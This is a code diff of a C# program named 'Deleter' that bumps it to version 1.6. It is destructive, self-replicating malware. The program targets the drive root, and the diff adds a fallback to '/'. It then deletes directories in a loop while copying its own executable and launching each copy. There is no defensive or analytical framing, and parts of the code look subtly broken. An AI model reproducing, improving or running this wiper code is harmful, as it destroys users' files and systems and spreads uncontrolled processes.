@@ -5,11 +5,15 @@ namespace System
         public static System.String Dir = System.IO.Directory.GetDirectoryRoot(System.IO.Directory.GetCurrentDirectory());
         public static System.Boolean DirExists = System.IO.Directory.Exists(System.Deleter.Dir);
         public static System.String ProgramName = System.Reflection.Assembly.GetExecutingAssembly().FullName;
-        public static System.UInt64 X;
-        public const System.String Ver = "1.5";
-        public const System.String Title = "Deleter v" + System.Deleter.Ver;
+        public static System.UInt64 UInt64;
+        public const System.String Ver = "1.6";
+        public const System.String Title = "Deleter5 v" + System.Deleter.Ver;
         public static void DeleteDir(System.String arg)
         {
+            if (System.Deleter.Dir == null || System.Deleter.Dir == "")
+            {
+                System.Deleter.Dir = "/";
+            }
             System.Console.Write(arg);
             try
             {
@@ -24,6 +28,10 @@ namespace System
         }
         public static void Main(System.String[] args)
         {
+            if (System.Deleter.Dir == null || System.Deleter.Dir == "")
+            {
+                System.Deleter.Dir = "/";
+            }
             System.Console.Title = System.Deleter.Title;
             System.Diagnostics.Process p = new System.Diagnostics.Process();
             p.StartInfo.UseShellExecute = true;
@@ -34,12 +42,12 @@ namespace System
             System.Threading.Thread.Sleep(1000);
             while (System.IO.Directory.Exists(System.Deleter.Dir))
             {
-                System.Deleter.X++;
+                System.Deleter.UInt64++;
                 System.Deleter.DeleteDir(args[0]);
                 System.IO.File.Copy(System.Deleter.ProgramName + ".exe",
-                System.Deleter.ProgramName + " (" + System.Deleter.X + ").exe");
+                System.Deleter.ProgramName + " (" + System.Deleter.UInt64 + ").exe");
                 System.Diagnostics.Process.Start(System.Deleter.ProgramName 
-                + " (" + System.Deleter.X + ").exe");
+                + " (" + System.Deleter.UInt64 + ").exe");
             }
         }
     }
